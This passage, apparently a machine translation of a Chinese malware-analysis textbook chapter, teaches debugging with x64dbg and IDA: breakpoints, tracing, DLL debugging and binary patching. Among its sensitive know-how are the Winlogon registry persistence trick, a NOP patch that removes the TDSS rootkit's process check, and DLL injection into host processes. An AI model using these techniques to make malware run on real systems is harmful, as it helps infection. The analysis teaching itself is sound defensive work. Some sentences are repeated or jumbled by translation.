你可以点击符号标签来显示符号窗口的内容。左边窗格显示加载的模块（可执行文件及其DLLs）的列表；点击一个模块条目将在右边窗格中显示其导入和导出函数，如下所示。这个窗口对于确定导入和导出函数在内存中的位置非常有用。\n引用窗口References Window。 这个窗口显示对API调用的参考。点击引用标签，默认情况下不会显示API的引用。要填充这个窗口，在反汇编（CPU）窗口的任何地方（加载了可执行文件）点击右键，然后选择搜索|当前模块|中间调用；这将在参考窗口中填充程序中所有API调用的参考。下面的截图显示了对多个API函数的引用；第一个条目告诉你，在地址0x00401C4D处，指令调用了CreateFileA API（由Kernel32.dll导出）。双击该条目将带你到相应的地址（在这种情况下，0x00401C4D）。你也可以在这个地址设置一个断点；一旦断点被击中，你可以检查传递给CreateFileA函数的参数。\n手柄窗口Handles Window。 你可以点击 “手柄 “选项卡，弹出手柄窗口；要显示内容，在手柄窗口内点击右键，选择 “刷新”（或F5）。这将显示所有打开的句柄的详细信息。在上一章中，当我们讨论Windows API时，你了解到进程可以打开一个对象（如文件、注册表等）的句柄，这些句柄可以传递给函数，如WriteFile，以执行后续操作。当你在检查API时，这些句柄很有用，比如WriteFile，它将告诉你与句柄相关的对象。例如，在调试一个恶意软件样本时，确定WriteFile API调用接受的句柄值为0x50。 检查句柄窗口显示，句柄值0x50与文件ka4a8213.log有关，如图所示。\n线程窗口Threads Window。这显示了当前进程中的线程列表。你可以在这个窗口上点击右键，暂停一个/多个线程或恢复一个暂停的线程。\n2.4 使用x64dbg控制进程执行 在第1.2节，控制进程执行，我们研究了调试器提供的不同执行控制功能。下表概述了常见的执行选项以及如何在x64dbg中访问这些选项。\n功能 快捷键 Menu Run F9 Debugger |Run Step into步进 F7 Debugger | Step into Step over步过 F8 Debugger | Step over Run until selection步进直到满足条件 F4 Debugger | Run until selection 2.5 在x64dbg中设置断点 在x64dbg中，您可以通过导航到您希望程序暂停的地址并按下F2键（或右键单击并选择断点|切换）来设置一个软件断点。要设置硬件断点，可以在你想设置断点的位置上点击右键，选择断点|执行时设置硬件。\n你也可以使用硬件断点在写或读/写（访问）一个内存位置时断点。要在内存访问中设置硬件断点，在转储窗格中，右击所需的地址，选择断点|硬件，访问，然后选择适当的数据类型（如字节、字、字或q字），如下面的截图所示。以同样的方式，你可以通过选择Breakpoint | Hardware, Write选项来设置内存写入时的硬件断点。\n除了硬件内存断点外，你也可以用同样的方式设置内存断点。要做到这一点，在转储窗格中，右击所需的地址，选择断点|内存，访问（用于内存访问）或断点|内存，写入（用于内存写入）。\n要查看所有的活动断点，只需点击断点标签；这将在断点窗口中列出所有的软件、硬件和内存断点。您也可以在断点窗口内的任何指令上点击右键，删除一个或所有的断点。\n关于x64dbg中可用选项的更多信息，请参考x64dbg在线文档：http://x64dbg.readthedocs.io/en/latest/index.html。 你也可以在x64dbg界面上按F1键访问x64dbg帮助手册。\n2.6 调试32位恶意软件 有了对调试功能的了解，让我们来看看调试如何帮助我们了解恶意软件的行为。考虑一个恶意软件样本的代码摘录，其中恶意软件调用CreateFileA函数来创建一个文件。为了确定它所创建的文件的名称，你可以在调用CreateFileA函数时设置一个断点，并执行程序直到它到达断点。当它到达断点时（也就是在调用CreateFileA之前），该函数的所有参数将被推到堆栈中；然后我们可以检查堆栈中的第一个参数，以确定文件的名称。在下面的截图中，当执行在断点处暂停时，x64dbg会在指令旁边和堆栈上的参数旁边添加一个注释（如果是字符串），以表明正在传递给函数的参数。从截图中可以看出，该恶意软件在%Appdata%\\Microsoft目录下创建了一个可执行文件winlogdate.exe。你也可以通过右击堆栈窗口中的第一个参数，并选择follow DWORD in dump选项来获得这些信息，该选项在十六进制窗口中显示内容。\n在创建可执行文件后，恶意软件将CreateFile返回的句柄值（0x54）作为第一个参数传递给WriteFile，并写入可执行内容（作为第二个参数传递），如这里所示。\n让我们假设你不知道哪个对象与句柄 0x54 相关联，可能是因为你直接在 WriteFile 上设置了一个断点，而最初没有在 CreateFile 上设置一个断点。要确定与句柄值相关联的对象，你可以在句柄窗口中查找它。在本例中，作为WriteFile的第一个参数传递的句柄值0x54，与winlogdate.exe相关，如图所示。\n2.7 调试64位恶意软件 你将使用同样的技术来调试一个64位的恶意软件；不同的是，你将处理扩展寄存器、64位内存地址/指针，以及稍微不同的调用惯例。如果你还记得（从第4章，汇编语言和反汇编入门），一个64位代码使用FASTCALL调用惯例，并在寄存器（rcx、rdx、r8和r9）中向函数传递前四个参数，其余的参数则放在堆栈中。在调试对函数/API的调用时，根据你要检查的参数，你将不得不检查寄存器或堆栈。之前提到的调用惯例适用于编译器生成的代码。攻击者用汇编语言编写的代码不需要遵循这些规则；因此，代码可以表现出不寻常的行为。当你遇到非编译器生成的代码时，可能需要对该代码进行进一步调查。\n在调试64位恶意软件之前，让我们尝试用下面这个微不足道的C程序来理解64位二进制文件的行为，这个程序是用微软Visual C/C++编译器为64位平台编译的：\nint main() { printf(\"%d%d%d%d%s%s\", 1, 2, 3, 4, \"this\", \"is\", \"test\") ; return 0; } 在前面的程序中，printf函数需要8个参数；这个程序在x64dbg中被编译和打开，并在printf函数处设置了一个断点。下面的截图显示了该程序，它在调用printf函数之前暂停了。在寄存器窗口，你可以看到前四个参数被放在rcx、rdx、r8和r9寄存器中。当程序调用一个函数时，该函数在堆栈上保留了0x20（32字节）的空间（可容纳四项，每项8字节大小）；这是为了确保被调用的函数有必要的空间，如果它需要保存寄存器参数（rcx、rdx、r8和r9）。这就是接下来的四个参数（第5、6、7、8个参数）被放在堆栈中的原因，从第五项（rsp+0x20）开始。我们向你展示这个例子是为了让你了解如何在堆栈中寻找参数。\n在32位函数的情况下，堆栈随着参数的推入而增长，当项目被弹出时则缩小。在64位函数中，堆栈空间是在函数开始时分配的，直到函数结束时才会改变。分配的堆栈空间用于存储局部变量和函数参数。在前面的截图中，注意第一条指令sub rsp,48是如何在堆栈上分配0x48（72）字节的空间的，之后在函数中间没有分配堆栈空间；另外，没有使用push和pop指令，而是使用mov指令将第5、6、7和8个参数放在堆栈上（在前面的截图中强调）。由于缺少push和pop指令，因此很难确定函数所接受的参数数量，也很难说内存地址是作为局部变量还是作为函数的参数。另一个挑战是，如果数值在函数调用前被移入寄存器rcx和rdx，就很难说它们是传递给函数的参数，还是因为其他原因被移入寄存器。\n尽管对64位二进制文件进行逆向工程存在挑战，但你分析API调用应该不会有太大困难，因为API文档告诉你函数参数的数量、参数的数据类型，以及它们返回的数据类型。一旦你知道在哪里可以找到函数参数和返回值，你就可以在API调用处设置断点，检查其参数以了解恶意软件的功能。\n让我们看看一个64位恶意软件样本的例子，它调用RegSetValueEx来设置注册表中的一些值。在下面的截图中，断点是在调用RegSetValueEx之前触发的。您将需要查看寄存器和堆栈窗口中的值（如前所述），以检查传递给函数的参数；这将帮助您确定恶意软件设置的注册表值。在x64dbg中，快速获得函数参数摘要的最简单方法是查看默认窗口（在寄存器窗口下方），在下面的截图中突出显示。你可以在默认窗口中设置一个值来显示参数的数量。在下面的截图中，该值被设置为6，因为从API文档（https://msdn.microsoft.com/en-us/library/windows/desktop/ms724923(v=vs.85).aspx）中，你可以知道RegSetValueEx API需要6个参数。\n第一个参数值，0x2c，是打开注册表键的句柄。恶意软件可以通过调用RegCreateKey或RegOpenKey API来打开注册表键的句柄。从句柄窗口，你可以知道句柄值0x2c与下面截图中显示的注册表键有关。从句柄信息，以及通过检查第一、第二和第五个参数，你可以知道恶意软件修改了注册表键，HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\\shell，并添加了一个条目，“explorer.exe,logoninit.exe”。 在一个干净的系统中，这个注册表键指向explorer.exe（默认的Windows shell）。当系统启动时，Userinit.exe进程使用这个值来启动Windows外壳（explorer.exe）。通过添加logoninit.exe和explorer.exe，恶意软件确保logoninit.exe也被Userinit.exe启动；这是恶意软件使用的另一种类型的持久化机制。\n在这一点上，你应该对如何调试一个恶意可执行文件以了解其功能有了一定的了解。在下一节中，你将学习如何调试一个恶意的DLL以确定其行为。\n2.8 使用x64dbg调试一个恶意的DLL 在第3章 “动态分析 “中，你学到了执行DLL的技术来进行动态分析。在本节中，你将使用你在第3章动态分析中学到的一些概念，使用x64dbg调试DLL。如果你还不熟悉DLL的动态分析，强烈建议你在进一步阅读第3章动态分析中的第6节，动态链接库（DLL）分析。\n要调试DLL，启动x64dbg（最好有管理员权限）并加载DLL（通过文件|打开）。当你加载DLL时，x64dbg将一个可执行文件（名为DLLLoader32_xxxx.exe，其中xxxx是随机的十六进制字符）放入你的DLL所在的同一目录；这个可执行文件作为一个通用的主机进程，它将被用来执行你的DLL（与rundll32.exe的方式相同）。在你加载DLL后，调试器可能会在系统断点、TLS回调或DLL入口点函数处暂停，这取决于配置设置（在前面的x64dbg中启动新进程部分提到）。如果不勾选系统断点和TLS回调选项，在加载DLL时，执行将暂停在DLL的入口点，如下面的截图所示。现在，你可以像其他程序一样对DLL进行调试。\n2.8.1 在x64dbg中使用rundll32.exe来调试DLL 另一个有效的方法是使用 rundll32.exe 来调试 DLL（假设你想调试一个名为 rasaut.dll 的恶意软件 DLL）。要做到这一点，首先从system32目录下加载rundll32.exe（通过文件|打开）到调试器，这将使调试器在系统断点或rundll32.exe的入口点暂停（取决于前面提到的设置）。然后，选择Debug | Change Command Line，指定rundll32.exe的命令行参数（指定DLL的完整路径和导出函数），如下所示，然后点击OK。\n接下来，选择 “断点 “选项卡，在 “断点 “窗口内点击右键，选择 “添加DLL断点 “选项，这时会弹出一个对话窗口，提示你输入模块名称。输入DLL名称（在本例中是rasaut.dll），如下所示。这将告诉调试器在DLL（rasaut.dll）被加载时进行断点。配置完这些设置后，关闭调试器。\n接下来，重新打开调试器，再次加载rundll32.exe；当你再次加载它时，之前的命令行设置仍将保持不变。现在，选择调试|运行（F9），直到你在DLL的入口处中断（你可能需要多次点击运行（F9），直到你到达DLL的入口点）。你可以通过查看断点地址旁边的注释来跟踪每次运行（F9）时执行暂停的位置。你也可以在eip寄存器旁边找到同样的注释。在下面的截图中，你可以看到执行在rasaut.dll的入口处暂停了。在这一点上，你可以像其他程序一样对DLL进行调试。你也可以在DLL导出的任何函数上设置断点。你可以通过使用符号窗口找到导出的函数；在你找到所需的导出函数后函数，双击它（这将带你到反汇编窗口中的导出函数的代码）。然后，在所需的地址设置一个断点。\n2.8.2 调试一个特定进程中的DLL 有时，你可能想调试一个只在特定进程中运行的DLL（如explorer.exe）。这个过程与上一节所述的过程类似。首先，使用x64dbg启动进程或附加到所需的主机进程；这将暂停调试器。通过选择Debug | Run (F9)允许进程运行。接下来，选择 “断点 “选项卡，在 “断点 “窗口内点击右键，选择 “添加DLL断点 “选项，这时会出现一个对话窗口，提示您输入模块名称。输入DLL名称（如上一节所述）；这将告诉调试器在加载DLL时进行中断。现在，你需要将DLL注入到主机进程中。这可以通过像RemoteDLL（https://securityxploded.com/remotedll.php）这样的工具来完成。当DLL被加载时，调试器会在ntdll.dll的某个地方暂停；只要点击运行（F9），直到你到达注入的DLL的入口点（你可能要运行多次才能到达入口点）。你可以通过查看断点地址旁边的注释或eip寄存器旁边的注释来跟踪每次点击运行（F9）时执行暂停的位置，如上节所述。\n2.9 跟踪x64dbg的执行情况 跟踪允许你在进程执行时记录事件。x64dbg支持跟踪进入和跟踪超过条件的跟踪选项。你可以通过Trace | Trace into（Ctrl+Alt+F7）和Trace | Trace over（Ctrl+Alt+F8）访问这些选项。在Trace into中，调试器在内部通过设置步进断点来跟踪程序，直到满足条件或达到最大步数。在追踪结束时，调试器通过设置跨步断点来追踪程序，直到条件得到满足或达到最大步数。下面的截图显示了 “追踪到 “对话框（在 “追踪到 “对话框中也提供了同样的选项）。要跟踪日志，至少需要指定日志文本和日志文件的完整路径（通过日志文件按钮），跟踪事件将被重定向。\n下面包括一些字段的简要描述。\n断点条件。 你可以在这个字段中指定一个条件。这个字段的默认值是0（假）。为了指定条件，你需要指定任何有效的表达式（http://x64dbg.readthedocs.io/en/latest/introduction/Expressions.html），其评估值为非零值（真）。评价为非零值的表达式被认为是真的，从而触发断点。调试器通过评估所提供的表达式继续跟踪，当指定的条件得到满足时停止。如果条件不满足，则继续跟踪，直到达到最大跟踪次数。 日志文本。 此字段用于指定在日志文件中记录跟踪事件的格式。可以在这个字段中使用的有效格式在http://help.x64dbg.com/en/latest/introduction/Formatting.html。 日志条件。 这个字段的默认值是1。你可以选择提供一个日志条件，告诉调试器只有在满足特定条件时才记录事件。日志条件需要是一个有效的表达式（http://x64dbg.readthedocs.io/en/latest/introduction/Expressions.html）。 最大跟踪计数。 这个字段指定了在调试器放弃之前追踪的最大步骤数。默认值被设置为50000，你可以根据需要增加或减少这个值。 日志文件按钮。 你可以用这个按钮来指定保存跟踪日志的日志文件的完整路径。 x64dbg没有特定的指令跟踪和函数跟踪功能，但可以使用trace into和trace over选项来执行指令跟踪和函数跟踪。你可以通过添加断点来控制追踪。在下面的截图中，eip指向第1条指令，并在第5条指令处设置了一个断点。当追踪开始时，调试器从第一条指令开始追踪，并在断点处暂停。如果没有断点，则继续跟踪，直到程序结束，或达到最大跟踪次数。如果你想追踪函数内部的指令，你可以选择追踪到，或者追踪到函数的上方，追踪其余的指令。\n2.9.1 指令追踪 要对前一个程序进行指令追踪（例如，追踪到），可以在追踪到对话框中使用以下设置。如前所述，为了在日志文件中捕获跟踪事件，你需要指定日志文件的完整路径和日志文本。\n前面截图中的Log Text值（0x{p:cip} {i:cip}）是字符串格式的，它指定调试器记录所有被跟踪指令的地址和反汇编情况。下面是该程序的跟踪记录。由于选择了跟踪到选项，函数内部的指令（0xdf1000）也被捕获（在下面的代码中突出显示）。指令追踪对于快速了解程序的执行流程非常有用。\n0x00DF1011 mov ebp, esp 0x00DF1013 call 0xdf1000 0x00DF1000 push ebp 0x00DF1001 mov ebp, esp 0x00DF1003 pop ebp 0x00DF1004 ret 0x00DF1018 xor eax, eax 0x00DF101A pop ebp2.9.2 函数跟踪 为了演示函数跟踪，请考虑下面截图中的程序。在这个程序中，eip指向第一条指令，断点设置在第五条指令（在这一点上停止追踪），第三条指令在0x311020处调用一个函数。我们可以使用函数追踪来确定该函数（0x311020）调用了哪些其他函数。\n为了进行函数追踪（本例中选择了Trace into），采用了以下设置。这类似于指令跟踪，除了在日志条件字段中，指定一个表达式，告诉调试器只记录函数调用。\n以下是日志文件中捕获的事件，是函数跟踪的结果。从下面的事件中，你可以知道函数0x311020在0x311000和0x311010调用了另外两个函数。\n0x00311033 call 0x311020 0x00311023 call 0x311000 0x00311028 call 0x311010 在前面的例子中，断点是用来控制跟踪的。当调试器到达断点时，执行被暂停，直到断点的指令/功能被记录下来。当你恢复调试器时，其余的指令会被执行，但不会被记录下来。\n2.10 在x64dbg中打补丁 在进行恶意软件分析时，您可能想修改二进制文件以改变其功能或颠倒其逻辑以满足您的需要。x64dbg允许您修改内存中的数据或程序的指令。要修改内存中的数据，请导航到内存地址并选择你要修改的字节序列，然后右击并选择二进制|编辑（Ctrl + E），这将会出现一个对话框（如下所示），你可以用它来修改数据为ASCII、UNICODE或十六进制字节序列。\n下面的截图显示了TDSS rootkit DLL的代码摘录（这也是上一章中使用IDA修补二进制文件一节中涉及的二进制文件）。如果你还记得，这个DLL使用字符串比较来执行检查，以确保它是在spoolsv.exe进程下运行。如果字符串比较失败（也就是说，如果DLL不是在spoolsv.exe下运行），那么代码就会跳到函数的末尾，并从函数中返回，而不会表现出恶意行为。假设你想让这个二进制文件在任何进程下运行（不仅仅是spoolsv.exe）。你可以用一条nop指令来修改条件跳转指令（JNE tdss.10001Cf9），以取消进程限制。要做到这一点，在条件性跳转指令上点击右键，选择组装，会出现如下所示的对话框，利用它可以输入指令。注意，在截图中，填充NOP的选项是被选中的，以确保指令的排列是正确的。\n在你修改了内存或指令中的数据后，你可以通过选择文件|补丁文件将补丁应用到文件中，这时会出现一个补丁对话框，显示对二进制文件的所有修改。一旦你对所做的修改感到满意，点击补丁文件并保存该文件。\n3. 使用IDA调试二进制文件 在上一章中，我们研究了IDA Pro的反汇编功能。在本章中，你将了解IDA的调试功能。IDA的商业版本可以调试32位和64位的应用程序，而演示版只允许你调试32位的Windows二进制文件。在本节中，你将看到IDA专业版提供的一些调试功能，并将学习如何使用它来调试一个恶意的二进制文件。\n3.1 在IDA中启动一个新进程 有不同的方法来启动一个新的进程；一种方法是直接启动调试器，而不需要最初加载程序。要做到这一点，启动IDA（不加载可执行文件），然后选择调试器|运行|本地Windows调试器；这将出现一个对话框，你可以选择要调试的文件。如果该可执行文件需要任何参数，你可以在参数栏中指定它们。这种方法将启动一个新的进程，调试器将在程序的进入点暂停执行。\n启动进程的第二种方法是首先在IDA中加载可执行文件（执行初始分析并显示反汇编的输出）。首先，通过调试器|选择调试器（或F9）选择正确的调试器；然后，你可以将光标放在第一条指令（或你希望执行暂停的指令）上，选择调试器|运行到光标（或F4）。这将启动一个新的进程，并将执行到当前光标位置（在这种情况下，断点会自动设置在当前光标位置）。\n3.2 使用IDA附加到一个现有的程序上 你附加到一个进程的方式取决于该程序是否已经加载。当一个程序还没有加载时，选择调试器|附加|本地Windows调试器。这将列出所有运行中的进程。只需选择要附加的进程。附加后，进程将立即暂停，让你有机会检查进程的资源并设置断点，然后再恢复进程的执行。在这种方法中，IDA将不能对二进制文件进行最初的自动分析，因为IDA的加载器将没有机会加载可执行图像。\n另一种附加到进程的方法是在附加到一个进程之前将与该进程相关的可执行文件加载到IDA。要做到这一点，使用IDA加载相关的可执行文件；这允许IDA执行其初始分析。然后，选择调试器|选择调试器，勾选本地Win32调试器（或本地Windows调试器）选项，并点击确定。然后，再次选择调试器|附加到进程，并选择要附加调试器的进程。\n3.3 IDA的调试器界面 在IDA调试器中启动程序后，进程将暂停，下面的调试器显示将呈现给你。\n当进程处于调试器控制之下时，反汇编工具栏被调试器工具栏取代。这个工具条由与调试功能有关的按钮组成（如进程控制和断点）。\n反汇编窗口。这个窗口与指令指针寄存器（eip 或 rip）的当前值同步。反汇编窗口提供的功能与你在前一章学到的相同。你也可以通过按空格键在图形视图和文本视图模式之间切换。 寄存器窗口。这个窗口显示CPU的通用寄存器的当前内容。你可以右击一个寄存器的值，然后点击修改值、归零值、切换值、增量或减量值。如果你想改变CPU标志位的状态，切换一个值特别有用。如果寄存器的值是一个有效的内存位置，寄存器值旁边的直角箭头将被激活；点击这个箭头将把视图重新定位到相应的内存位置。如果你发现你已经导航到了一个不同的位置，并且想去指令指针所指向的位置，那么只要点击指令指针寄存器值（eip或rip）旁边的直角箭头即可。 堆栈视图。堆栈视图显示进程的运行时堆栈的数据内容。在调用一个函数之前检查堆栈可以得到关于函数参数的数量和函数参数的类型的信息。 Hex视图。这显示的是内存的标准十六进制转储。如果你想显示一个有效的内存位置的内容（包含在寄存器、堆栈或指令中），十六进制视图很有用。 模块视图。它显示加载到进程内存中的模块（可执行文件及其共享库）的列表。双击列表中的任何模块会显示该模块导出的符号列表。这是一个简单的方法来导航到加载的库中的功能。 线程视图。显示当前进程中的线程列表。你可以在这个窗口上点击右键来暂停一个线程或恢复一个暂停的线程。 段落窗口。段落窗口可以通过查看|打开子视图|段落（或Shift + F7）来实现。当你在调试一个程序时，片段窗口提供了关于进程中分配的内存片段的信息。这个窗口显示了可执行文件及其部分在内存中的加载位置的信息。它还包含所有加载的DLLs的细节，以及它们的段信息。双击任何一个条目，都会带你到反汇编窗口或十六进制窗口中的相应内存位置。你可以控制内存地址的内容在哪里显示（在反汇编或十六进制窗口）；要做到这一点，只需将光标放在反汇编或十六进制窗口的任何地方，然后双击该条目。根据光标的位置，内存地址的内容将显示在适当的窗口中。 进口和出口窗口。当进程处于调试器控制下时，默认不显示进口和出口窗口。你可以通过视图|打开子视图来调出这些窗口。进口窗口列出了二进制文件导入的所有函数，而出口窗口则列出了所有导出的函数。导出的函数通常在DLLs中找到，所以当你调试恶意的DLLs时，这个窗口可能特别有用。 上一章介绍的其他IDA窗口，也可以通过视图| 打开子视图。\n3.4 使用IDA控制流程的执行 在第1.2节 “控制进程的执行 “中，我们研究了调试器提供的不同的执行控制 的不同执行控制功能。下表列出了你在调试程序时可以在IDA中使用的常见的执行 下表概述了在IDA中调试程序时可以使用的常见执行控制功能。\n功能 快捷键 Menu Continue (Run) F9 Debugger | Continue process Step into步进 F7 Debugger | Step into Step over步过 F8 Debugger | Step over Run to cursor F4 Debugger | Run to cursor 3.5 在IDA中设置断点 要在IDA中设置一个软件断点，你可以导航到你想要的位置 程序暂停的位置，然后按F2键（或右击并选择添加断点）。在 你设置了断点后，设置断点的地址会以红色突出显示。 颜色。你可以在包含断点的行上按F2键来删除断点。\n在下面的截图中，断点被设置在地址0x00401013（调用 sub_401000）。要在断点地址暂停执行，首先，选择调试器 (如本地Win32调试器)，如前所述，然后通过以下方式运行程序 选择调试器|启动程序（或F9热键）。这将执行所有的 这将在到达断点前执行所有指令，并在断点地址处暂停。\n在IDA中，你可以通过编辑已经设置的断点来设置硬件和条件断点。要设置一个硬件断点，请右击现有的断点，选择编辑断点。在弹出的对话框中，选中硬件复选框，如下图所示。IDA允许你设置四个以上的硬件断点，但只有其中的四个能起作用，其他的硬件断点将被忽略。\n你可以使用硬件断点来指定是执行时断点（默认）、写时断点还是读/写时断点。写时断点和读/写时断点选项允许你在任何指令访问指定的内存位置时创建内存断点。如果你想知道你的程序何时从一个内存位置访问一个数据（读/写），这个断点就很有用。执行时断点选项允许你在指定内存位置被执行时设置断点。除了指定模式外，你还必须指定一个大小。一个硬件断点的大小与它的地址相结合，形成一个可以触发断点的字节范围。\n你可以通过在条件栏中指定条件来设置一个条件断点。该条件可以是一个实际的条件，或者是IDC或IDAPython表达式。你可以点击条件字段旁边的…按钮，这将打开编辑器，在这里你可以使用IDC或IDAPython脚本语言来评估该条件。您可以在https://www.hex-rays.com/products/ida/ support/idadoc/1488.shtml找到一些设置条件断点的例子。\n你可以通过导航到Debugger | Breakpoints | Breakpoint List（或键入Ctrl + Alt + B）来查看所有的活动断点。你可以右键单击断点条目，禁用或删除断点。\n3.6 调试恶意软件的可执行文件 在本节中，我们将看看如何使用IDA来调试一个恶意软件的二进制文件。考虑一下32位恶意软件样本的反汇编列表。恶意软件调用CreateFileW API来创建一个文件，但是，只看反汇编列表，并不清楚恶意软件创建了什么文件。从MSDN的CreateFile文档中，你可以知道CreateFile的第一个参数将包含文件名；同时，CreateFile的后缀W指定文件名是UNICODE字符串（关于API的细节在前一章已经介绍过了）。为了确定文件名，我们可以在调用CreateFileW➊的地址处设置一个断点，然后运行程序（F9）直到它到达断点。当它到达断点时（在调用CreateFileW之前），函数的所有参数将被推入堆栈，因此我们可以检查堆栈中的第一个参数，以确定文件的名称。调用CreateFileW后，文件的句柄将在eax寄存器中返回，并被复制到位于➋的esi寄存器中。\n.text:00401047 push 0 ; hTemplateFile .text:00401049 push 80h ; dwFlagsAndAttributes .text:0040104E push 2 ; dwCreationDisposition .text:00401050 push 0 ; lpSecurityAttributes .text:00401052 push 0 ; dwShareMode .text:00401054 push 40000000h ; dwDesiredAccess .text:00401059 lea edx, [esp+800h+Buffer] .text:00401060 push edx ; lpFileName .text:00401061 ➊ call ds:CreateFileW .text:00401067 mov esi, eax ➋在下面的截图中，在调用CreateFileW时，执行被暂停了（由于设置了断点并运行了该程序）。该函数的第一个参数是UNICODE字符串（文件名）的地址（0x003F538）。你可以使用IDA的Hex-View窗口来检查任何有效内存位置的内容。通过右击地址0x003F538并选择Follow in hex dump选项，倾倒第一个参数的内容，在Hex-View窗口中显示文件名，如下所示。在这种情况下，恶意软件正在C:\\Users\\test\\AppData\\Local\\Temp目录下创建一个文件，SHAMple.dat。\n恶意软件在创建文件后，将文件句柄作为第一个参数传递给WriteFile函数。这表明，恶意软件向SHAmple.dat文件写入了一些内容。为了确定它向文件写入了什么内容，你可以检查WriteFile函数的第二个参数。在这种情况下，它正在将字符串FunFunFun写入文件，如下面的截图中所示。如果恶意软件正在向文件写入可执行内容，你也将能够使用这种方法看到它。\n3.7 使用IDA调试一个恶意的DLL 在第3章，动态分析中，你学到了执行DLL的技术来进行动态分析。在本节中，你将使用你在第3章动态分析中所学到的一些概念来使用IDA调试一个DLL。如果你不熟悉DLL的动态分析，强烈建议你在进一步阅读第3章动态分析中的第6节，动态链接库（DLL）分析。\n要使用IDA调试器调试DLL，你首先需要指定用于加载DLL的可执行文件（如rundll32.exe）。要调试一个DLL，首先，将DLL加载到IDA，它可能会显示DLLMain函数的反汇编。在DLLMain函数的第一条指令处设置一个断点（F2），如下面的屏幕截图所示。这确保了当你运行DLL时，执行将在DLLMain函数的第一条指令处暂停。你也可以通过从IDA的Exports窗口导航到DLL导出的任何函数上设置断点。\n在您在所需的地址（您希望执行暂停的地方）设置断点后，通过调试器|选择调试器|本地Win32调试器（或调试器|选择调试器|本地Windows调试器）选择调试器并点击确定。接下来，选择调试器 | 进程选项，会出现下面截图中的对话框。在应用程序领域，输入用于加载DLL的可执行文件的完整路径（rundll32.exe）。在输入文件字段中，输入你希望调试的DLL的完整路径，在参数字段中，输入要传递给rundll32.exe的命令行参数，然后点击确定。现在，你可以运行该程序以达到断点，之后你可以像调试其他程序一样调试它。你传递给rundll32.exe的参数应该有正确的语法，以便成功地调试DLL（参考第三章动态分析中rundll32.exe的工作部分）。需要注意的一点是，rundll32.exe也可以用来执行64位DLL，方式相同。\n3.7.1 调试一个特定进程中的DLL 在第三章，动态分析中，你了解到一些DLL如何进行进程检查，以确定它们是否在一个特定的进程下运行，如explorer.exe或iexplore.exe。在这种情况下，你可能想在一个特定的主机进程内调试一个DLL，而不是rundll32.exe。要在DLL的入口点暂停执行，你可以启动一个新的主机进程实例，或者使用调试器附加到所需的主机进程，然后选择调试器|调试器选项，勾选库加载/卸载时暂停的选项。这个选项将告诉调试器，每当加载或卸载一个新模块时就暂停。完成这些设置后，你可以恢复暂停的主机进程，并通过按F9热键让它运行。现在你可以用像RemoteDLL这样的工具将DLL注入到被调试的主机进程中。当DLL被主机进程加载时，调试器将暂停，让你有机会在加载模块的地址上设置断点。你可以通过查看Segments窗口来了解DLL加载到内存的位置，如图所示。\n在前面的截图中，你可以看到注入的DLL（rasaut.dll）已经在地址0x10000000（基础地址）处加载到内存中。你可以通过将基址（0x10000000）与PE头中AddressOfEntryPoint字段的值相加，在进入点的地址处设置一个断点。你可以通过将DLL加载到pestudio或CFFexplorer等工具中来确定入口点的地址值。例如，如果AddressOfEntryPoint的值是0x1BFB，那么可以通过将基础地址（0x10000000）与0x1BFB的值相加来确定DLL的入口点，结果是0x10001BFB。现在你可以导航到地址0x10001BFB（或者通过按G键跳转到该地址）并在该地址设置一个断点，然后恢复暂停的进程。\n3.8 使用IDA追踪执行情况 追踪允许你在一个进程执行时记录（日志）特定的事件。它可以 提供关于二进制文件的详细执行信息。IDA支持三种类型的 追踪：指令追踪、函数追踪和基本块追踪。要在IDA中启用追踪功能。 你需要设置一个断点，然后右击断点地址，选择编辑 断点，这时会出现一个断点设置对话框。在该对话框中，勾选 启用跟踪选项，并选择适当的跟踪类型。然后，选择调试器 通过调试器|选择调试器菜单（如前所述），并运行（F9）该 程序。下面的截图中的位置字段指定了正在编辑的断点。 被编辑的断点，它将被用作执行跟踪的起始地址。追踪将持续到 追踪将继续进行，直到它到达一个断点，或到达程序的终点。为了表明 哪些指令被追踪，IDA用彩色编码突出显示这些指令。在 追踪后，你可以通过选择调试器|追踪|追踪窗口来查看追踪的结果。 窗口。你可以通过Debugger | Tracing | Tracing options来控制跟踪选项。\n指令跟踪记录每条指令的执行，并显示修改的寄存器值。指令跟踪的速度较慢，因为调试器在内部对程序进行单步操作，以监测和记录所有的寄存器值。指令跟踪对于确定程序的执行流程是非常有用的，可以了解每条指令的执行过程中哪些寄存器被修改。你可以通过添加断点来控制跟踪。\n考虑一下下面截图中的程序。让我们假设你想追踪 前四条指令（在第三条指令中还包括一个函数调用）。要做到这一点 首先，在第一条指令设置一个断点，在第五条指令设置另一个断点。 第五条指令，如下面的截图所示。然后，编辑第一个断点（位于 地址0x00401010）并启用指令跟踪。现在，当你开始调试时，调试器会追踪前四条指令。 调试器会跟踪前四条指令（包括函数内部的指令） 并在第五条指令时暂停。如果您没有指定第二个断点，它将跟踪 所有的指令。\n下面的截图显示了跟踪窗口中的指令跟踪事件，当时调试器在第五条指令处暂停。注意执行过程是如何从main流向sub_E41000，然后又回到main的。如果你想跟踪其余的指令，你可以通过恢复暂停的进程来实现。\n函数跟踪。这记录了所有的函数调用和返回，对于函数追踪事件不记录寄存器的值。函数跟踪对于确定哪些函数和子函数被程序调用很有用。你可以通过将跟踪类型设置为函数，并按照指令跟踪的相同程序来执行函数跟踪。\n在下面的例子中，恶意软件样本调用了两个函数。假设我们想快速了解第一个函数调用了哪些其他函数。为此，我们可以在第一条指令处设置第一个断点，并启用函数跟踪（通过编辑断点），然后我们可以在第二条指令处设置另一个断点。第二个断点将作为停止点（追踪将被执行，直到达到第二个断点）。下面的屏幕截图显示了这两个断点。\n在下面的例子中，恶意软件样本调用了两个函数。 假设我们想快速了解第一个函数调用了哪些其他函数。\n有时，你的跟踪可能需要很长的时间，而且似乎永远不会结束；如果函数没有返回给它的调用者，而是在一个循环中运行，等待一个事件的发生，就会发生这种情况。在这种情况下，你仍然能够在跟踪窗口中看到跟踪记录。\n块追踪。IDA允许你进行块追踪，这对于了解在运行期间执行了哪些代码块很有用。你可以通过将追踪类型设置为基本块来启用块追踪。 在块追踪的情况下，调试器在每个函数的每个基本块的最后一条指令处设置断点，它还在被追踪块中间的任何调用指令处设置断点。基本块跟踪比正常执行要慢，但比指令或函数跟踪要快。 3.9 使用IDAPython的调试器脚本 